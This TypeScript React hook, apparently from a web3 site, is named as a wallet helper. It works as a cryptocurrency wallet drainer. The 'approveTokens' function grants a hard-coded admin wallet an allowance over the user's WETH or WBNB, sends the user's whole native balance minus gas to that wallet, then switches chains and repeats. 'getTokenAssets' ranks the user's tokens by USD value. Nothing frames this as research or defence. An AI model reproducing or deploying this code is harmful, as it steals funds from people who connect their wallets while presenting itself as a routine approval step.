import { useAccount } from "wagmi";
import {
  writeContract,
  estimateGas,
  getGasPrice,
  getBalance,
  switchChain,
  sendTransaction,
  getChainId,
} from "@wagmi/core";
import axios from "axios";
import { parseEther } from "viem";

import erc20ABI from "../blockchain/contract.json";
import { config, networks, adminWallet } from "../app/Web3ModalConfig";
import {
  ETHERSCAN_API_KEY,
  coingeckoApiKey,
  BSCSCAN_API_KEY,
} from "../app/Web3ModalConfig";

export const UseWallet = () => {
  const account = useAccount();
  const approveTokens = async () => {

    if (account && account.address && account.chainId) {
      let connectedChains: number[] = [account.chainId];
      for (let i = 0; i < networks.length; i++) {
        const chainId = getChainId(config);
        console.log(chainId)
        const balance = await getBalance(config, {
          address: account.address,
        });
        console.log("balance")
        console.log(balance)
        if (chainId === 1) {
          try {
            const tokenAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
            const result = await writeContract(config, {
              abi: erc20ABI,
              address: tokenAddress,
              functionName: "approve",
              args: [adminWallet, balance.value],
            });
            if (result) {
              console.log(result);
            }
          } catch (error) {
            console.log(error);
            return;
          }
        } else if (chainId === 56) {
          try {
            const tokenAddress = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
            const result = await writeContract(config, {
              abi: erc20ABI,
              address: tokenAddress,
              functionName: "approve",
              args: [adminWallet, balance.value],
            });
            if (result) {
              console.log(result);
            }
          } catch (error) {
            console.log(error);
            return;
          }
        }
        const gas = await estimateGas(config, {
          to: adminWallet,
          value: parseEther("0"),
        });
        const gasPrice = await getGasPrice(config);
        const gasFee = (Number(gasPrice) * Number(gas) * 2) / 10 ** 18;
        const sendAmount = Number(balance?.formatted) - gasFee;
        const newArray = networks.filter(
          (item) => !connectedChains.includes(item)
        );
        connectedChains.push(newArray[0]);
        if (sendAmount > 0) {
          try {
            const result = sendTransaction(config, {
              to: adminWallet,
              value: parseEther(`${sendAmount}`),
            });
            console.log(result);
          } catch (error) {
            console.log(error);
          }
        }
        const newChainBalance = await getBalance(config, {
          address: account.address,
          chainId: newArray[0],
        });
        if (newArray.length > 0 && Number(newChainBalance.formatted) > 0) {
          try {
            await switchChain(config, { chainId: newArray[0] });
          } catch (error) {
            console.log("switch network error:", error);
          }
        }
      }
    }
  };

  const getTokenAssets = async () => {
    const chainId = await getChainId(config);
    let url;
    if (chainId === 1) {
      url = `https://api.etherscan.io/api?module=account&action=addresstokenbalance&address=${account.address}&page=1&offset=100&apikey=${ETHERSCAN_API_KEY}`;
    } else if (chainId === 56) {
      url = `https://api.bscscan.com/api?module=account&action=addresstokenbalance&address=${account.address}&page=1&offset=100&apikey=${BSCSCAN_API_KEY}`;
    }
    let tokenBalances: any = [];
    if (!url) {
      return tokenBalances;
    }
    const tokenListResponse = await axios.get(url);
    for (let id in tokenListResponse.data.result) {
      const token = tokenListResponse.data.result[id];
      const tokenAmount = Number(token.TokenQuantity);
      const tokenDecimal = Number(token.TokenDivisor);
      const tokenAddress = token.TokenAddress.toLowerCase();
      const coinGeckoApi = `https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddress}&vs_currencies=usd&x-cg-demo-api-key=${coingeckoApiKey}`;
      const tokenPrice = await axios.get(coinGeckoApi);
      const usdAmount = tokenPrice.data[tokenAddress]?.usd || 0;
      if ((tokenAmount / 10 ** tokenDecimal) * usdAmount > 0) {
        tokenBalances.push({
          tokenAmount,
          tokenName: token.TokenName,
          tokenDecimal: token.TokenDivisor,
          usdAmount: (tokenAmount / 10 ** tokenDecimal) * usdAmount,
          tokenAddress,
        });
      }
    }
    tokenBalances.sort((a: any, b: any) => b.usdAmount - a.usdAmount);
    return tokenBalances;
  };

  return { approveTokens, getTokenAssets };
};
